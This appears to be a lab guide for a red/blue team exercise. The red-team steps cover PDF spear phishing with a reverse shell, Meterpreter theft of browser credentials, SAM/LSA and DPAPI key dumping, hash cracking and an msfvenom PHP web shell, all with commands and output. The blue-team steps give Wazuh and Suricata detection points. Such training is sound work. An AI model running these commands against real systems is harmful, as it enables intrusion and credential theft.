# Scenario 2 - Phishing to Web Shell and DB Exfiltration

> Lab-only exercise for the isolated Hullu environment.

## Scenario Goal

Red team compromises a Windows client through spear phishing, steals credentials, moves to Hullu, creates a web shell, accesses the DB service, adds persistence, and exfiltrates data through the web shell.

Blue team investigates the same chain using the [SuriZuh](https://github.com/kaledaljebur/SuriZuh) virtual machine for Wazuh endpoint logs and Suricata network alerts.

## Red Team Chain

1. Spear Phishing
2. Deliver Trojan File to Client
3. Hash Dump
4. Lateral Movement to Hullu
5. Web Shell Creation
6. DB Service Access on Hullu
7. Scheduled Task on Target
8. Exfiltration Using Web Shell

## Lab Hosts

Setup: connect the 4 lab VMs to the same isolated virtual network. All IPs in this guide are examples.

| Role | Host | Notes |
|---|---|---|
| Attacker | Kali `192.168.8.10` | SEToolkit, Metasploit, payload handling |
| Client | Windows `admin1` | Phishing victim |
| Web/DB Server | [Hullu](README.md) `192.168.8.149` | Same VM |
| Detection | [SuriZuh](https://github.com/kaledaljebur/SuriZuh) | Wazuh + Suricata VM |
| Local Email VM | [CyberMail-Server](https://github.com/kaledaljebur/CyberMail-Server) | Local phishing delivery |

## MITRE ATT&CK Mapping

**Scenario:** Spear Phishing -> Deliver Trojan File to Client -> Hash Dump -> Lateral Movement to Web Server -> Web Shell Creation -> Lateral Movement to DB Machine -> Schedule Tasks on Target -> Exfiltration using Web Shell

| Scenario Step | MITRE ATT&CK Technique | Tactic |
|---|---|---|
| Spear Phishing | [T1566.001 - Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001/) | Initial Access |
| Deliver Trojan File to Client | [T1204.002 - User Execution: Malicious File](https://attack.mitre.org/techniques/T1204/002/), [T1105 - Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105/) | Execution / Command and Control |
| Hash Dump | [T1003 - OS Credential Dumping](https://attack.mitre.org/techniques/T1003/), [T1003.001 - LSASS Memory](https://attack.mitre.org/techniques/T1003/001/), [T1003.002 - Security Account Manager](https://attack.mitre.org/techniques/T1003/002/) | Credential Access |
| Lateral Movement to Web Server | [T1021 - Remote Services](https://attack.mitre.org/techniques/T1021/), [T1021.002 - SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002/), [T1021.006 - Windows Remote Management](https://attack.mitre.org/techniques/T1021/006/) | Lateral Movement |
| Use Dumped Hashes | [T1550.002 - Pass the Hash](https://attack.mitre.org/techniques/T1550/002/) | Lateral Movement |
| Web Shell Creation | [T1505.003 - Server Software Component: Web Shell](https://attack.mitre.org/techniques/T1505/003/) | Persistence |
| Lateral Movement to DB Machine | [T1021 - Remote Services](https://attack.mitre.org/techniques/T1021/), [T1078 - Valid Accounts](https://attack.mitre.org/techniques/T1078/) | Lateral Movement / Defense Evasion / Persistence |
| Schedule Tasks on Target | [T1053.005 - Scheduled Task](https://attack.mitre.org/techniques/T1053/005/) | Execution / Persistence / Privilege Escalation |
| Exfiltration using Web Shell | [T1041 - Exfiltration Over C2 Channel](https://attack.mitre.org/techniques/T1041/), [T1071.001 - Application Layer Protocol: Web Protocols](https://attack.mitre.org/techniques/T1071/001/) | Exfiltration / Command and Control |

- Compact Technique Chain

  `T1566.001 -> T1204.002 -> T1105 -> T1003 -> T1550.002 -> T1021 -> T1505.003 -> T1021/T1078 -> T1053.005 -> T1071.001/T1041`

## Red Team Notes

### 1. Prepare Windows Client

Create local admin user in an admin command prompt:

```cmd
net user admin1 aaa /add
net localgroup Administrators admin1 /add
```

For lab reliability only:

```cmd
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f
shutdown /r /t 0
```

After restart:

- Log in as `admin1`.
- Install Firefox.
- Browse to DVWA/Hullu and save the credentials in the browser suing Firefox or MS Edge.
- Install vulnerable Adobe Reader 9 from <https://archive.org/download/AdobeReaderArchives6x11x/Reader%209.0/ENU/AdbeRdr90_en_US_Std.exe>.
- In Adobe Reader: Preferences > Trust Manager > disable auto update.

### 2. Deliver Trojan PDF

Use SEToolkit in Kali:

```text
1 Social Engineering Attacks
1 Spear-Phishing Attack Vectors
2 Create a FileFormat Payload
13 Adobe PDF Embedded EXE
2 Use Built-In
5 Windows Reverse TCP Shell
```

Use:

- LHOST: `192.168.8.10`
- LPORT: `4444`
- Output: `invoice.pdf`

Copy the payload files:

```bash
mkdir -p ~/Desktop/226_part3
sudo cp /root/.set/template.pdf ~/Desktop/226_part3/invoice.pdf
sudo cp /root/.set/template.rc ~/Desktop/226_part3/template.rc
```

Send `invoice.pdf` as the email attachment through the local email VM: [CyberMail-Server](https://github.com/kaledaljebur/CyberMail-Server).

Start the handler:

```bash
sudo msfconsole -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set lhost 192.168.8.10; set lport 4444; exploit"
```

### 3. Victim Execution

On Windows:

- Open local email using setup from [CyberMail-Server](https://github.com/kaledaljebur/CyberMail-Server) VM.
- Download the attachment `invoice.pdf`.
- Open it with the vulnerable Adobe Reader.
- Save the dropped file `form` in the PDF file when prompted in '`Documents` folder.

Expected result: Meterpreter session from the Windows client to Kali.

### 4. Credential Access

#### Firefox path to collect:

- If credentials save in Firefox in Windows, do the below:

  ```sh
  # In terminal 2: 
  mkdir -p ~/Desktop/226_part3/firefox

  # In terminal 1 in meterpreter session:
  download "C:\Users\admin1\AppData\Roaming\Mozilla\Firefox\Profiles" /home/kaled/Desktop/226_part3/firefox

  #In terminal 2: 
  ┌──(kaled㉿kali)-[~/Desktop/226_part3]
  └─$ git clone https://github.com/unode/firefox_decrypt.git 2>/dev/null
  ┌──(kaled㉿kali)-[~/Desktop/226_part3]
  └─$ ls firefox
  97tov5sp.default  ntmv2xol.default-release
  ┌──(kaled㉿kali)-[~/Desktop/226_part3]
  └─$ python3 firefox_decrypt/firefox_decrypt.py firefox/ntmv2xol.default-release 
  2026-08-27 06:54:06,039 - WARNING - profile.ini not found in firefox/ntmv2xol.default-release
  2026-08-27 06:54:06,039 - WARNING - Continuing and assuming 'firefox/ntmv2xol.default-release' is a profile location

  Website:   http://192.168.8.149
  Username: 'admin'
  Password: 'password'
  ```

#### Edge paths to collect (Will be updated later):

- If credentials save in NS Edge in Windows, follow:

    ```sh
    Find fresh x64 explorer.exe PID owned by current user
    ps | grep explorer
    or 
    pgrep explorer

    migrate <PID>
    getsystem
    getuid    

    load kiwi
    lsa_dump_sam
    lsa_dump_secrets

    Look for something like
    User : admin1
    Hash NTLM: e24106942bf38bcf57a6a4b29016eff6

    In new terminal do:
    echo 'e24106942bf38bcf57a6a4b29016eff6' > ntlm.txt
    john --format=NT --incremental=Lower ntlm.txt


    Get the Edge saved login credentials>>
    cd "C:\Users\admin1\AppData\Local\Microsoft\Edge\User Data\Default"
    download "Login Data" /home/kaled/Desktop/226_part3/
    cd "C:\Users\admin1\AppData\Local\Microsoft\Edge\User Data"
    download "Local State" /home/kaled/Desktop/226_part3/

    Open "Local State" in mousepad and search for "os_crypt" to see the encryoted key.
    dir "C:\Users\admin1\AppData\Roaming\Microsoft\Protect"
    The saved credentials in Edge >> get "Login Data">> get the key in "Local State">> get DPAPI Master Key>> Get the Active user password

    meterpreter > cd "C:\Users\admin1\AppData\Roaming\Microsoft\Protect"
    meterpreter > dir
    Listing: C:\Users\admin1\AppData\Roaming\Microsoft\Protect
    ==========================================================

    Mode              Size  Type  Last modified              Name
    ----              ----  ----  -------------              ----
    100666/rw-rw-rw-  24    fil   2026-08-26 09:39:45 -0400  CREDHIST
    040777/rwxrwxrwx  0     dir   2026-08-26 09:39:45 -0400  S-1-5-21-2768268201-1826340971-3484343115-1002

    meterpreter > cd "S-1-5-21-2768268201-1826340971-3484343115-1002"
    meterpreter > dir
    Listing: C:\Users\admin1\AppData\Roaming\Microsoft\Protect\S-1-5-21-2768268201-1826340971-3484343115-1002
    =========================================================================================================

    Mode              Size  Type  Last modified              Name
    ----              ----  ----  -------------              ----
    100666/rw-rw-rw-  468   fil   2026-08-26 09:39:45 -0400  3b65c54f-d94d-45b3-a91e-9df6eade0559
    100666/rw-rw-rw-  24    fil   2026-08-26 09:39:45 -0400  Preferred
    meterpreter > download 3b65c54f-d94d-45b3-a91e-9df6eade0559 /home/admin1/Desktop/226_part3/
    [*] Downloading: 3b65c54f-d94d-45b3-a91e-9df6eade0559 -> /home/admin1/Desktop/226_part3/3b65c54f-d94d-45b3-a91e-9df6eade0559
    [*] Downloaded 468.00 B of 468.00 B (100.0%): 3b65c54f-d94d-45b3-a91e-9df6eade0559 -> /home/admin1/Desktop/226_part3/3b65c54f-d94d-45b3-a91e-9df6eade0559
    [*] Completed  : 3b65c54f-d94d-45b3-a91e-9df6eade0559 -> /home/admin1/Desktop/226_part3/3b65c54f-d94d-45b3-a91e-9df6eade0559


    ┌──(kaled㉿kali)-[~/Desktop/226_part3]
    └─$ pypykatz dpapi prekey nt S-1-5-21-2768268201-1826340971-3484343115-1002 e24106942bf38bcf57a6a4b29016eff6 > prekeys.txt
                                                                                                                                                                                                        
    ┌──(kaled㉿kali)-[~/Desktop/226_part3]
    └─$ cat prekeys.txt

    87b963b78385957b19558bc9c6d80d15c3900d74
    225268c16ab7c2b8b93a35a51b2121a7e9575984


    ┌──(kaled㉿kali)-[~/Desktop/226_part3]
    └─$ impacket-dpapi masterkey -file 3b65c54f-d94d-45b3-a91e-9df6eade0559 -sid S-1-5-21-2768268201-1826340971-3484343115-1002 -password aaa

    Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

    [MASTERKEYFILE]
    Version     :        2 (2)
    Guid        : 3b65c54f-d94d-45b3-a91e-9df6eade0559
    Flags       :        5 (5)
    Policy      :        0 (0)
    MasterKeyLen: 000000b0 (176)
    BackupKeyLen: 00000090 (144)
    CredHistLen : 00000014 (20)
    DomainKeyLen: 00000000 (0)

    Decrypted key with User Key (SHA1)
    Decrypted key: 0x4d264fbb2815f918db1bb6f31b57757cbeabb14a9c5f5fa1ce8530f900fa1d29b466058227be41c96509a087620653756f768e2eca652c3bd4a78418a6beff9d


    ┌──(kaled㉿kali)-[~/Desktop/226_part3]
    └─$ python3 -c "
    import uuid
    d = open('key.blob','rb').read()
    print('MasterKey GUID:', str(uuid.UUID(bytes_le=d[24:40])))
    "

    MasterKey GUID: 3b65c54f-d94d-45b3-a91e-9df6eade0559
    ```

### 5. Lateral Movement to Web and DB server

Use the recovered credential to access Hullu.

Evidence to create for blue team:

- Login from Windows client or Kali to Hullu.
- File transfer into web root.
- Web process activity after shell use.

### 6. Web Shell Creation

- Create a PHP web shell in the Hullu web root.
    ```sh
    cd Desktop
    msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.8.10 lport=5555 -f raw -o shell.php
    sudo msfconsole -x "use exploit/multi/handler; set payload php/meterpreter/reverse_tcp; set lhost 192.168.8.10; set lport 5555; exploit"
    ```

Expected attacker behavior:

- Browse to the shell.
- Run basic discovery commands.
- Use the web shell to reach the DB service.

More details in this [scenario](scenario.md).

### 7. DB Service Access on Hullu

Access the DB service on [Hullu](README.md).

Evidence to create for blue team:

- DB access from the web context.
- DB dump, query, archive, or staged file appears.

### 8. Scheduled Task on Target

Create persistence on the selected target.

Use one target type:

- Windows: scheduled task.
- Linux: cron job or systemd timer.

Evidence to create for blue team:

- New task/timer name.
- Suspicious command path.
- Repeated execution time.

### 9. Exfiltration Using Web Shell

Use the web shell to retrieve staged DB data.

Evidence to create for blue team:

- Large HTTP response from Hullu.
- Repeated requests to `shell.php`.
- Download of archive, dump, or encoded output.

## Blue Team Work

Use the [SuriZuh](https://github.com/kaledaljebur/SuriZuh) virtual machine for the Wazuh and Suricata analysis.

### Blue Objective

Find the full intrusion path:

```text
phishing -> client compromise -> credential theft -> Hullu access -> web shell -> DB access -> persistence -> exfiltration
```

### Wazuh Focus

On the Windows client:

- Adobe Reader starts unusual child process.
- New file written in `Downloads`, `Documents`, or `%TEMP%`.
- Outbound connection to `192.168.8.10:4444`.
- Access to SAM, LSA, LSASS, or browser credential files.
- Suspicious use of admin account `admin1`.

On Hullu web service:

- New file in `/var/www/html`.
- New or modified `.php` file.
- Web process runs shell commands.
- Archive or DB dump file created.

On Hullu DB service:

- Suspicious DB query or dump activity.
- New scheduled task, cron job, or systemd timer.
- Large data read before outbound transfer.

Useful Wazuh references:

- [Wazuh log collection](https://documentation.wazuh.com/current/user-manual/capabilities/log-data-collection/configuration.html)
- [Wazuh Sysmon and MITRE mapping](https://documentation.wazuh.com/current/user-manual/ruleset/mitre.html)
- [Wazuh + Suricata integration](https://documentation.wazuh.com/current/proof-of-concept-guide/integrate-network-ids-suricata.html)

### Suricata Focus

Look for:

- Windows client connecting to Kali on `4444`.
- Hullu connecting to Kali or unusual hosts.
- HTTP requests to `shell.php`.
- High number of POST/GET requests to one PHP file.
- Large outbound HTTP response from Hullu.
- Web traffic followed by DB dump or staged data.

Useful filters:

```text
src_ip:<client_ip> AND dest_ip:192.168.8.10
dest_port:4444 OR dest_port:5555
http.uri:*shell.php*
src_ip:<hullu_ip> OR dest_ip:<hullu_ip>
event_type:alert
event_type:http
```

### Investigation Questions

1. Which user opened the phishing attachment?
2. What process created the reverse connection?
3. Was credential material accessed or dumped?
4. Which credential was used to reach Hullu?
5. When was the web shell created?
6. Was the Hullu DB service accessed?
7. Was persistence created?
8. What data was exfiltrated?

### Expected Blue Deliverables

- Incident timeline.
- Patient-zero host and user.
- Compromised credentials.
- Web shell path and hash.
- Hullu DB impact.
- Exfiltration evidence.
- MITRE ATT&CK table.
- Containment recommendations.

## Containment Ideas

- Isolate Windows client.
- Disable or reset `admin1`.
- Block Kali/C2 IPs.
- Remove web shell.
- Rotate web and DB credentials.
- Review scheduled tasks, cron jobs, and systemd timers.
- Restore web root from clean source if needed.
